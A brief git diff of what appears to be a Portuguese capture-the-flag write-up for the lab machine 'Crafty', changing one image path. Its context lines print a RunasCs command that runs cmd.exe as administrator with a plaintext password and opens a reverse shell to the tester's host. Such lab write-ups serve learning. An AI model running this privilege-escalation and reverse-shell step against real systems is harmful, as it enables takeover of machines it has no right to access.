@@ -287,7 +287,7 @@ crafty\administrator
 Confirmado que é a senha do admin, executei uma reverse shell com runascs.exe
 
 `c:\Users\svc_minecraft\Documents>run.exe administrator s67u84zKq8IXw cmd.exe -r 10.10.14:126:4446`
-![alt text](../assets/img/crafty/crafty7.png)
+![alt text](/assets/img/crafty/crafty7.png)
 
 ### Segunda Flag
 ![alt text](/assets/img/crafty/crafty8.png)
